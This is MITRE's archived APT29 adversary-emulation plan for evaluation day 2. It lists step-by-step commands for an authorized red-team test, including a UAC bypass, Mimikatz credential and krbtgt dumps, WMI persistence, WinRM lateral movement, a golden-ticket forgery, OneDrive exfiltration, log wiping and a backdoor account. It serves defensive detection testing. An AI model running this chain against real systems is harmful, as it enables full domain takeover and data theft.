# APT29 Day 2 (Steps 11 through 20) (ARCHIVED)

## Acknowledgements

### Special thanks to the following public resources:
*  Atomic Red Team (https://github.com/redcanaryco/atomic-red-team)
*  Mimikatz (https://github.com/gentilkiwi/mimikatz)
*  Pinvoke (http://www.pinvoke.net)
*  PoshC2 (https://github.com/nettitude/PoshC2)
*  POSHSPY (https://github.com/matthewdunwoody/POSHSPY)
*  PowerSploit (https://github.com/PowerShellMafia/PowerSploit)
*  PSReflect-Functions (https://github.com/jaredcatkinson/PSReflect-Functions)
*  State of the Hack S2E01: #NoEasyBreach REVISITED (https://www.fireeye.com/blog/products-and-services/2019/02/state-of-the-hack-no-easy-breach-revisited.html)
*  Use PowerShell to Interact with the Windows API (https://devblogs.microsoft.com/scripting/use-powershell-to-interact-with-the-windows-api-part-1)
*  Yet another sdclt UAC bypass (http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)

## Overview

*  Emulation of APT29 usage of tools such as PowerDuke, POSHSPY, CloudDuke, as well as more recent (2016+) TTPs
*  Scenario begins with a target spearphishing leading into a low and slow, methodical approach to owning the initial target and eventually the entire domain
*  Includes establishing persistence, credential gathering, local and remote enumeration, and data exfil
*  Modular components (ex: PowerShell scripts) may be executed atomically

## Requirements

### Victim Systems:
1.  3 targets 
    * [ ] 1 domain controller and 2 workstations
    * [ ] All Windows OS (tested and executed against Win10 1903)
    * [ ] Domain joined with at least 2 accounts (domain admin and another user)
2.  Microsoft Outlook must be available locally on one of the victim workstations

### Red Team Systems:
1.  Server running an offensive framework (we tested and executed using PoshC2 -- https://github.com/nettitude/PoshC2) capable of:
    * [ ] Executing native PowerShell commands
    * [ ] Loading and executing PowerShell scripts (.ps1)
    * [ ] Generating a DLL payload and an encoded PowerShell oneliner 
    * [ ] Receiving and maintaining multiple callbacks at once
2.  Online OneDrive Account (https://onedrive.live.com/)

## Red Team Setup

### Generate an encoded PowerShell oneliner payload, then copy:
1. Just the encoded portion (ex: `WwBTAH...=`) into `$enc_ps variable` (4th line from bottom) in `schemas.ps1`
    *  ex: `$enc_ps = "WwBTAH...=="`
2. The entire value (ex: `powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAH...=`) into `CommandLineTemplate` variable (under `$ConsumerArgs` in 2nd paragraph) in `stepFifteen_wmi.ps1`
    *  ex: `CommandLineTemplate="powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAH...="`
3. The entire value (ex: `powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAH...=`) into `-Value` variable (2nd line) in `stepFourteen_bypassUAC.ps1`
    *  ex: `New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value "powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAH...="`

### Generate DLL payload, then on a separate Windows host:
1. [CMD] > `certutil -encode [file].dll blob`
2. [CMD] > `powershell`
3. [PS] > `$blob = (Get-Content .\blob) -join ""; $blob > .\blob`
4. Open `blob` file in text editor
5. Delete new line at end of file and copy all (CTRL-A, CTRL-C)
6. Paste value (ex: `-----BEGIN CERTIFICATE-----...-----END CERTIFICATE-----`) into `$bin` variable (6th line) in `schemas.ps1`

### Copy payloads to C2 server (wherever is appropriate for your C2 framework to have access to these files)

### Update `stepFourteen_credDump.ps1` -- directions are in file

### Prepare initial access payloads:
1.  Login as non-domain admin user
2.  Copy over the following files onto the Desktop of the initial victim:
    1. `2016_United_States_presidential_election_-_Wikipedia.html`
    2. `make_lnk.ps1`
    3. `schemas.ps1`
2.  Copy over `MITRE-ATTACK-EVALS.HTML` into the Documents folder of the initial victim
3.  Execute `make_lnk.ps1` (Right click > Run with PowerShell), this will generate `37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk`
4.  Drag `make_lnk.ps1` and `schemas.ps1` to Recycle Bin and empty the Recycle Bin (Right click > Empty Recycle Bin)

## Victim Setup

### For each of the 3 victims:
1. Login in as domain admin user
2. Ensure Windows Defender is off or configured to alert-only (https://support.microsoft.com/en-us/help/4027187/windows-10-turn-off-antivirus-protection-windows-security)
3. Change network type to Domain (https://www.itechtics.com/change-network-type-windows-10/#2-_Setting_network_type_using_Windows_Registry)
4. Set UAC to never notify (https://articulate.com/support/article/how-to-turn-user-account-control-on-or-off-in-windows-10)
5. Enable WinRM (https://support.microsoft.com/en-us/help/555966)
6. Enable UseLogonCredential in the WDigest Registry settings (https://support.microsoft.com/help/2871997/microsoft-security-advisory-update-to-improve-credentials-protection-a)

### For the initial victim (the workstation with Microsoft Outlook):
1. Login as non-domain admin user
2. Enable programatic access to Microsoft Outlook (https://www.slipstick.com/developer/change-programmatic-access-options/)
3. Open Outlook and sign in if necessary

## Beginning of Day2 Execution

### Step 11 - Initial Breach

#### 11.A

1.  As non-domain admin user, execute `37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk` (double click), output will display in terminal
2.  You will now receive a new, low integrity callback

### Step 12 - Fortify Access

#### 12.A

1. Load `timestomp.ps1`
2. Execute `timestomp C:\Users\oscar\AppData\Roaming\Microsoft\kxwn.lock`

#### 12.B

1.  Load `stepTwelve.ps1`
2.  Execute `detectav`

#### 12.C

1.  Execute `software`

### Step 13 - Local Enumeration

#### 13.A

1.  Load `stepThirteen.ps1`
2.  Execute `comp`

#### 13.B

1.  Execute `domain`

#### 13.C

1.  Execute `user`

#### 13.D

1.  Execute `pslist`

### Step 14 - Elevation

#### 14.A

1.  Load `stepFourteen_bypassUAC.ps1`
2.  Execute `bypass`
3.  You will now receive a new, high integrity callback

#### 14.B
    
1.  Go to  where m.exe is on C2 server in another terminal
2.  Confirm `m.exe` is there and is a Windows PE (`$ file m`)
    *  `m.exe` is a copy of the Mimikatz executable (available at https://github.com/gentilkiwi/mimikatz)
3.  Host file on port 8080 (`$ sudo python -m SimpleHTTPServer 8080`)
4.  Interact with new callback
5.  Load `stepFourteen_credDump.ps1`
6.  Execute `wmidump`
7.  Kill the python server (CTRL-C) once you see a GET request on the python server (VM terminal)

### Step 15 - Establish Persistence

#### 15.A

1.  Load `stepFifteen_wmi.ps1`
2.  Execute `wmi`
    
**Note:** Do not RDP into the initial access from this point forward, you will trigger callbacks intended for step 20

### Step 16 - Lateral Movement

#### 16.A

1.  Interact with low integrity callback
2.  Load `powerView.ps1` (available at https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
3.  Execute `get-netdomaincontroller`

#### 16.B

1. Load `stepSixteen_SID.ps1`
2. Execute `siduser`
3. Save the value for the domain SID (ex: `S-1-5-21-2219224806-3979921203-557828661-1110`) and delete the RID (ex: `-1110`) of the end (ex: `S-1-5-21-2219224806-3979921203-557828661`)

#### 16.C

1. Interact with high integrity callback
2. Load `Invoke-WinRMSession.ps1` (available at https://github.com/nettitude/PoshC2/blob/master/resources/modules/Invoke-WinRMSession.ps1)
3. Execute `invoke-winrmsession -Username "[insert domain admin username]" -Password "[insert domain admin password]" -IPAddress [insert domain controller IP]`
4. Output will tell you a session opened and give you the format for using it, ex:
    `Session opened, to run a command do the following:`
    `Invoke-Command -Session $[session_id] -scriptblock {Get-Process} | out-string`
5. Save the value for the session_id (ex: `$hzaqx`)

**Note:** If you get an error here, reboot domain controller, then re-run the 2 winrm setup commands before re-executing 16.C

#### 16.D
		
1.  Execute `Copy-Item m.exe -Destination "C:\Windows\System32\" -ToSession $[session_id]`
    *  `m.exe` is a copy of the Mimikatz executable (available at https://github.com/gentilkiwi/mimikatz)
2.  Execute `Invoke-Command -Session $[session_id] -scriptblock {C:\Windows\System32\m.exe privilege::debug "lsadump::lsa /inject /name:krbtgt" exit} | out-string`
3.  Take note of value for the NTLM hash (ex: `NTLM : f4a688010d80770a55a22893dc6ac510`) near the top (Under RID and User after `* Primary`)
4.  Execute `Get-PSSession | Remove-PSSession`

### Step 17 - Collection

#### 17.A

1.  Interact with low integrity callback
2.  Load `stepSeventeen_email.ps1`
3.  Execute `psemail`

#### 17.B

1.  Interact with high integrity callback
2.  Execute `New-Item -Path "C:\Windows\Temp\" -Name "WindowsParentalControlMigration" -ItemType "directory"`
3.  Execute `Copy-Item "C:\Users\oscar\Documents\MITRE-ATTACK-EVALS.HTML" -Destination "C:\Windows\Temp\WindowsParentalControlMigration"`

#### 17.C

1.  Load `stepSeventeen_zip.ps1`
2.  Execute `zip C:\Windows\Temp\WindowsParentalControlMigration.tmp C:\Windows\Temp\WindowsParentalControlMigration`

### Step 18 - Exfiltration

#### 18.A

1.  Get CID for OneDrive account (https://www.laptopmag.com/articles/map-onedrive-network-drive)
2.  Execute `net use y: https://d.docs.live.net/[CID] /user:[OneDrive account]@outlook.com "[OneDrive password]"`
3.  Execute `Copy-Item "C:\Windows\Temp\WindowsParentalControlMigration.tmp" -Destination "Y:\WindowsParentalControlMigration.tmp"`
4.  Login to https://onedrive.live.com/?id=root&cid=[CID] to see exfil (`WindowsParentalControlMigration.tmp`)

### Step 19 - Clean UP

#### 19.A

1.  Load `wipe.ps1`
2.  Execute `wipe "C:\Windows\System32\m.exe"`
    
**Note:** There's a known bug here with ETW (Invoke-ReflectivePEInjection patches a function on the fly that ETW invokes) so callback may die and hang

#### 19.B

1.  Execute `wipe "C:\Windows\Temp\WindowsParentalControlMigration.tmp"`

#### 19.C

1.  Execute `wipe "C:\Windows\Temp\WindowsParentalControlMigration\MITRE-ATTACK-EVALS.HTML"`

### Step 20 - Leverage Persistence

#### 20.A

1.  Execute `restart-computer -force`
2.  Existing 2 callbacks should die
3.  RDP and login to initial victim once it reboots
4.  Persistence mechanisms should fire on login (1 for DLL, 1 or more for WMI event subscription)

**Note:** You may need to repeat login process a few times (close and reopen RDP session) for WMI execute to fire

#### 20.B
    
1.  Interact with the SYSTEM PS callback (from WMI)
2.  Execute `klist purge`
3.  Load `Invoke-Mimikatz.ps1` (available at https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)
4.  Execute `invoke-mimikatz -command '"kerberos::golden /domain:dmevals.local /sid:[SID] /rc4:[NTLM HASH] /user:mscott /ptt"'` using the SID and NTLM values from earlier
5.  Execute `klist` and confirm ticket is in cache
6.  Execute `Enter-PSSession [hostname of second workstation in domain]`
7.  Execute `Invoke-Command -ComputerName [hostname of second workstation in domain] -ScriptBlock {net user /add toby "pamBeesly<3"}`

## Liability / Responsible Usage

This content is only to be used with appropriate prior, explicit authorization for the purposes of assessing security posture and/or research.

## Notice

Copyright 2020 The MITRE Corporation

Approved for Public Release; Distribution Unlimited. Case Number 19-03607-2.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

   http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.

This project makes use of ATT&CK®

[ATT&CK Terms of Use](https://attack.mitre.org/resources/terms-of-use/)
